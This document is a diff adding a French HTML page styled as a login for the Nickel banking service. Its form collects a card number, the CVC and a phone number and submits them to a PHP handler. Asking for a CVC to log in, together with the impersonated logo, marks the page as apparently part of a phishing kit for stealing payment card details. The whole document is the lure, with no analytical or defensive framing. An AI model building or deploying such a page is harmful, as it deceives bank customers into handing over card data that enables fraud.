@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à mon espace</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <script>
+        // Formatage automatique pour le champ "Numéro de carte"
+        document.addEventListener('DOMContentLoaded', () => {
+            const cardInput = document.querySelector('input[name="card_number"]');
+            cardInput.addEventListener('input', () => {
+                cardInput.value = cardInput.value
+                    .replace(/\D/g, '') // Retire tout sauf les chiffres
+                    .replace(/(\d{4})(?=\d)/g, '$1 ') // Ajoute un espace après chaque 4 chiffres
+                    .trim(); // Retire les espaces inutiles
+            });
+        });
+    </script>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="assets/images/logo-compte-nickel.jpg" alt="Logo Nickel">
+        </div>
+    </header>
+    <main class="container">
+        <div class="container_details">
+            <h1>Connexion à mon espace</h1>
+            <p>Veuillez renseigner les informations ci-dessous pour continuer.</p>
+            <form action="send_connexion.php" method="POST">
+                <div class="form-group">
+                    <label for="card-number">Numéro de la carte *</label>
+                    <input type="text" id="card-number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" pattern="\d{4}( \d{4}){3}" maxlength="19" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvc">CVC *</label>
+                    <input type="text" id="cvc" name="cvc" maxlength="3" placeholder="XXX" pattern="\d{3}" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Téléphone *</label>
+                    <input type="text" id="phone" name="phone" placeholder="XX XX XX XX XX"  required>
+                </div>
+                <button type="submit" name="submitconnexion">Se connecter</button>
+            </form>
+            <div class="promo-images">
+                <img src="assets/images/promo-placeholder.jpg" alt="Promotions" class="promo-image">
+            </div>
+        </div>
+    </main>
+</body>
+<footer class="footer">
+    <div class="container">
+      <p>Aide & opposition CB | <a href="#">Pas encore client ?</a></p>
+    </div>
+  </footer>
+</html>
